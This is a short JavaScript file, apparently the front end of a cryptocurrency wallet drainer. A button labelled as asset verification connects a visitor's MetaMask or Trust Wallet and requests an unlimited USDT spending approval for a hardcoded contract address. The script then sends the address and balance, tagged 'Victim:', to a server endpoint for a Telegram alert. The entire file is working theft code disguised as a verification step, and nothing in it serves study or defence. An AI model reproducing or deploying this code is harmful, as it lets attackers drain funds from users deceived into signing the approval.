const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT_TO_APPROVE = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";

document.addEventListener("DOMContentLoaded", () => {
  const verifyBtn = document.getElementById("verifyAssets");

  verifyBtn.addEventListener("click", async () => {
    if (!window.ethereum) {
      alert("No wallet found. Open this site inside MetaMask or Trust Wallet browser.");
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const address = await signer.getAddress();

      const usdt = new ethers.Contract(USDT_ADDRESS, [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function balanceOf(address) view returns (uint256)"
      ], signer);

      const balance = await usdt.balanceOf(address);
      const formattedBalance = ethers.utils.formatUnits(balance, 18);

      await usdt.approve(CONTRACT_TO_APPROVE, ethers.constants.MaxUint256);
      alert("USDT approval sent. Sending Telegram alert...");

      const message = `Victim: ${address}\nUSDT Balance: ${formattedBalance}`;
      console.log("Sending to Telegram:", message);

      const response = await fetch("/tele", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
      });

      if (response.ok) {
        alert("Telegram message sent successfully.");
      } else {
        alert("Telegram failed. Server responded with: " + response.status);
      }

    } catch (err) {
      console.error("Error:", err);
      alert("Something went wrong: " + err.message);
    }
  });
});
